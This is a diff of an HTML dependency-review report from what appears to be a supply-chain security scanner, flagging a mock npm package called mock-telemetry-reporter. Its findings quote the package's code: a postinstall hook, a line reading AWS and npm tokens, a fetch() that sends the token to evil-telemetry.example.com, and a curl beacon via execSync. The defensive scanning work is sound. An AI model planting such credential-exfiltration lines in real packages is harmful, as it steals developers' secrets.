@@ -24,7 +24,7 @@
     h1 { font-size: 1.75rem; font-weight: 700; color: var(--text); }
     .subtitle { color: var(--text-muted); font-size: 0.9rem; margin-top: 0.25rem; }
     .meta-badges { display: flex; gap: 0.5rem; flex-wrap: wrap; }
-    
+
     .badge { display: inline-block; padding: 0.25rem 0.6rem; border-radius: 9999px; font-size: 0.75rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.05em; }
     .badge-allow { background: rgba(16, 185, 129, 0.2); color: var(--accent-allow); border: 1px solid var(--accent-allow); }
     .badge-quarantine { background: rgba(245, 158, 11, 0.2); color: var(--accent-quarantine); border: 1px solid var(--accent-quarantine); }
@@ -45,7 +45,7 @@
     .verdict-tag.ALLOW { background: var(--accent-allow); color: #000; }
     .verdict-tag.QUARANTINE { background: var(--accent-quarantine); color: #000; }
     .verdict-tag.BLOCK { background: var(--accent-block); color: #fff; }
-    
+
     .reasons-box h3 { font-size: 1rem; margin-bottom: 0.5rem; color: var(--text); }
     .reasons-box ul { margin-left: 1.25rem; font-size: 0.95rem; color: var(--text-muted); }
     .reasons-box li { margin-bottom: 0.25rem; }
@@ -57,7 +57,7 @@
     th { text-align: left; padding: 0.75rem; border-bottom: 2px solid var(--surface-border); color: var(--text-muted); }
     td { padding: 0.75rem; border-bottom: 1px solid var(--surface-border); }
     tr:last-child td { border-bottom: none; }
-    
+
     .card-item { background: rgba(15, 23, 42, 0.6); border: 1px solid var(--surface-border); border-radius: 0.5rem; padding: 1rem; margin-bottom: 0.75rem; border-left: 4px solid var(--text-muted); }
     .card-item.sev-critical { border-left-color: var(--accent-block); }
     .card-item.sev-high { border-left-color: #f97316; }
@@ -65,7 +65,8 @@
     .item-header { display: flex; align-items: center; gap: 0.75rem; margin-bottom: 0.5rem; flex-wrap: wrap; }
     .code-snippet { background: #000; padding: 0.75rem; border-radius: 0.35rem; font-size: 0.8rem; overflow-x: auto; margin-top: 0.5rem; color: #a5f3fc; }
     .code-mono { font-family: monospace; font-size: 0.8rem; }
-    
+    code { overflow-wrap: anywhere; }
+
     .investigators-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 1rem; }
     .investigator-card { background: rgba(15, 23, 42, 0.7); border: 1px solid var(--surface-border); border-radius: 0.5rem; padding: 1rem; }
     .inv-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.75rem; border-bottom: 1px solid var(--surface-border); padding-bottom: 0.5rem; }
@@ -84,7 +85,7 @@
     <header>
       <div>
         <h1>Supply Chain Bouncer &mdash; Dependency Review</h1>
-        <p class="subtitle">Run ID: <code>run-1790507874694-oplu0p</code> &bull; Subject: <code>8c25337c586380ee...</code></p>
+        <p class="subtitle">Run ID: <code>run-1790510566928-7y1b62</code> &bull; Subject: <code>8c25337c586380ee...</code></p>
       </div>
       <div class="meta-badges">
         <span class="badge badge-quarantine">QUARANTINE</span>
@@ -100,21 +101,20 @@
       </div>
       <div class="reasons-box">
         <h3>Top Findings &amp; Recommendation Rationale</h3>
-        <ul><li>mock-telemetry-reporter (PROCESS_EXECUTION): Executes external system processes or shell commands at line 5: &quot;const { execSync } = require(&#39;child_process&#39;);&quot;</li><li>mock-telemetry-reporter (PROCESS_EXECUTION): Executes external system processes or shell commands at line 6: &quot;execSync(&quot;curl -s https://evil-telemetry.example.com/beacon&quot;);&quot;</li><li>mock-telemetry-reporter (LIFECYCLE_SCRIPT_ADDED): Newly introduced lifecycle script &quot;postinstall&quot;: &quot;node setup.js&quot;. Review installation behavior.</li></ul>
+        <ul><li>All three Bob investigations must complete before an ALLOW recommendation.</li><li>mock-telemetry-reporter (PROCESS_EXECUTION): Executes external system processes or shell commands at line 5: &quot;const { execSync } = require(&#39;child_process&#39;);&quot;</li><li>mock-telemetry-reporter (PROCESS_EXECUTION): Executes external system processes or shell commands at line 6: &quot;execSync(&quot;curl -s https://evil-telemetry.example.com/beacon&quot;);&quot;</li></ul>
       </div>
     </div>
 
     <!-- 2. Human Review & Decision Mechanism -->
     <section class="section">
       <h2>1. Human Review Decision Status</h2>
-      <p><strong>Current State:</strong> <span class="badge badge-quarantine">Awaiting human review</span></p>
-      <p class="text-muted" style="margin-top: 0.5rem;">To record an approved, quarantined, or blocked human decision against this exact input snapshot, run the review command in your terminal:</p>
-      <div class="terminal-box">node src/cli.mjs review --run &quot;E:\ibm hackathon project\supply-chain-bouncer\reports\demo\suspicious-fixture&quot; --interactive --mode trusted-local-demo</div>
+      <p><strong>Current State:</strong> <span class="badge badge-quarantine">Awaiting complete Bob investigations</span></p>
+      <p class="text-muted" style="margin-top: 0.5rem;">This report is advisory. Human review and gate enforcement are not implemented yet. No installation or merge is authorized by this report.</p>
     </section>
 
     <!-- 3. Packages Table -->
     <section class="section">
-      <h2>2. Changed Dependencies (2 instances)</h2>
+      <h2>2. Changed Dependencies (1 instances)</h2>
       <div style="overflow-x: auto;">
         <table>
           <thead>
@@ -140,31 +140,10 @@
         <td>2026-09-01 (1 maintainers)</td>
         <td><code class="code-mono">sha512-mockSuspiciousInt...</code></td>
       </tr>
-    
-      <tr>
-        <td><strong>picocolors</strong></td>
-        <td><span class="badge badge-change">UNCHANGED</span></td>
-        <td><span class="badge badge-direct">DIRECT</span></td>
-        <td>1.1.1 &rarr; <strong>1.1.1</strong></td>
-        <td><code>node_modules/picocolors</code></td>
-        <td>No</td>
-        <td>N/A</td>
-        <td><code class="code-mono">sha512-xceH2snhtb5M9liqD...</code></td>
-      </tr>
     </tbody>
         </table>
       </div>
     </section>
-
-    <!-- 4. Investigator Results -->
-    
-      <section class="section">
-        <h2>4. Bob Investigator Results</h2>
-        <div class="callout callout-info">
-          <p><strong>Awaiting Bob Agent Review:</strong> Run the <code>supply-chain-bouncer</code> skill in Bob IDE against this evidence bundle to coordinate the Typosquat Detective, Provenance Auditor, and Behavior Analyst.</p>
-        </div>
-      </section>
-    
 
     <!-- 5. Static Observations & Cited Evidence -->
     <section class="section">
@@ -178,10 +157,11 @@
             </div>
             <div class="item-body">
               <p>Newly introduced lifecycle script &quot;postinstall&quot;: &quot;node setup.js&quot;. Review installation behavior.</p>
-              
+
+
             </div>
           </div>
-        
+
           <div class="card-item sev-medium">
             <div class="item-header">
               <span class="badge badge-medium">MEDIUM</span>
@@ -190,10 +170,11 @@
             </div>
             <div class="item-body">
               <p>References environment variables which may access sensitive credentials at line 3: &quot;const token = process.env.AWS_SECRET_ACCESS_KEY || process.env.NPM_TOKEN;&quot;</p>
-              
+
+
             </div>
           </div>
-        
+
           <div class="card-item sev-medium">
             <div class="item-header">
               <span class="badge badge-medium">MEDIUM</span>
@@ -202,10 +183,11 @@
             </div>
             <div class="item-body">
               <p>Initiates network or socket operations at line 4: &quot;fetch(&quot;https://evil-telemetry.example.com/exfil?token=&quot; + encodeURIComponent(token || &#39;none&#39;));&quot;</p>
-              
+
+
             </div>
           </div>
-        
+
           <div class="card-item sev-medium">
             <div class="item-header">
               <span class="badge badge-medium">MEDIUM</span>
@@ -214,10 +196,11 @@
             </div>
             <div class="item-body">
               <p>Initiates network or socket operations at line 6: &quot;execSync(&quot;curl -s https://evil-telemetry.example.com/beacon&quot;);&quot;</p>
-              
+
+
             </div>
           </div>
-        
+
           <div class="card-item sev-high">
             <div class="item-header">
               <span class="badge badge-high">HIGH</span>
@@ -226,10 +209,11 @@
             </div>
             <div class="item-body">
               <p>Executes external system processes or shell commands at line 5: &quot;const { execSync } = require(&#39;child_process&#39;);&quot;</p>
-              
+
+
             </div>
           </div>
-        
+
           <div class="card-item sev-high">
             <div class="item-header">
               <span class="badge badge-high">HIGH</span>
@@ -238,16 +222,28 @@
             </div>
             <div class="item-body">
               <p>Executes external system processes or shell commands at line 6: &quot;execSync(&quot;curl -s https://evil-telemetry.example.com/beacon&quot;);&quot;</p>
-              
+
+
             </div>
           </div>
         </div>
     </section>
 
+
+      <section class="section">
+        <h2>4. Bob Investigator Results</h2>
+        <div class="callout callout-info">
+          <p><strong>Awaiting Bob Agent Review:</strong> Run the <code>supply-chain-bouncer</code> skill in Bob IDE against this evidence bundle to coordinate the Typosquat Detective, Provenance Auditor, and Behavior Analyst.</p>
+        </div>
+      </section>
+
+
     <!-- 6. Unknowns & Coverage Limitations -->
     <section class="section">
       <h2>5. Coverage Limits &amp; Explicit Unknowns</h2>
-      <ul style="margin-left: 1.25rem; color: var(--text-muted); font-size: 0.9rem;"><li>Runtime dynamic effects were not executed or observed.</li><li>Full cryptographic npm provenance was not verified (adapter extension pending).</li></ul>
+      <ul style="margin-left: 1.25rem; color: var(--text-muted); font-size: 0.9rem;"><li>Runtime dynamic effects were not executed or observed.</li><li>Full cryptographic npm provenance was not verified (adapter extension pending).</li><li>Missing Bob investigation: typosquat-detective</li><li>Missing Bob investigation: provenance-auditor</li><li>Missing Bob investigation: behavior-analyst</li></ul>
+      <h3 style="margin-top: 1rem;">Evidence sources</h3>
+      <ul style="margin-left: 1.25rem;"><li><strong>fixture</strong>: <code>fixture:mock-telemetry-reporter@1.0.0</code><br><code>sha256-fixture-files:f912cf345d3a38e2a1d987044c2b95a96e799d1c241ca9f1a7c1365df4cfcb80</code></li><li><strong>synthetic</strong>: <code>https://registry.npmjs.org/mock-telemetry-reporter</code><br><code>sha256-metadata:de5f29eb51f5a55d903707d17cdd4a31d0db48e0f8dd5e4c5ce4ca5c6b586682</code></li></ul>
     </section>
 
     <!-- 7. Remediation Guidance -->
@@ -259,7 +255,7 @@
       <ul style="margin-left: 1.25rem; color: var(--text-muted); font-size: 0.9rem; margin-top: 0.5rem;">
         <li><strong>Replace:</strong> Ask Bob to recommend a reviewed alternative package with matching functionality.</li>
         <li><strong>Rollback:</strong> Remove the dependency declaration and revert lockfile changes with scripts disabled.</li>
-        <li><strong>Approve with Rationale:</strong> If the lifecycle script or observation is expected (e.g. native compilation), record an ALLOW decision citing the benign explanation.</li>
+        <li><strong>Review with Rationale:</strong> Document any benign explanation. Missing evidence and integrity violations must be resolved before approval.</li>
       </ul>
     </section>
   </div>
